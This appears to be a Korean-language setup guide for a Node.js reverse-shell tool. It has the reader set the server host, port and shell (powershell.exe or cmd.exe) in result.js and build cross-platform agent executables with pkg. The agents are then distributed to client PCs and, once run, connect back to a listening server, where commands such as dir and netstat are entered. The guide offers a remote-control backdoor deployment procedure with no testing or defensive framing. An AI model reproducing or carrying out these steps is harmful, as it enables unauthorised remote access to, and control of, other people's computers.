★x1 필수 설치파일
1) Node.js
    1. (windows) https://nodejs.org/ko/download/
    2. (MacOSX) brew install node
    3. (Linux) yum install node
2) PKG //에이전트 파일 생성
    1. npm install pkg --g


★x2 코드 수정(result.js)
1) 리버스쉘을 연결할 서버 호스트(HOST_Address, HOST_PORT) 등록
const HOST_Address = [연결할 서버의 주소 입력]
const HOST_PORT = ["연결할 서버의 포트 입력"]

2) 리버스쉘 연결할 Command(COMMAND) 등록
const COMMAND  = "powershell.exe", "cmd.exe"

★x3 에이전트 파일 생성(With PKG)
1) compile.bat 실행
2) results 폴더 내 에이전트 파일 확인(windows, mac, linux)
3) 에이전트 파일 Client PC 배포

★x4 Server 측 포트 리스닝
1) node server.js
2) 대기

★x5 Client PC 측 에이전트 파일 실행
1) (windows) results_win.exe 파일 클릭
2) Connected 인 경우 연결성공

★x6 Server 
1) Open 된 Console 에 전달할 명령어를 삽입
dir, netstat, powershell.exe, echo [input text] [path]...


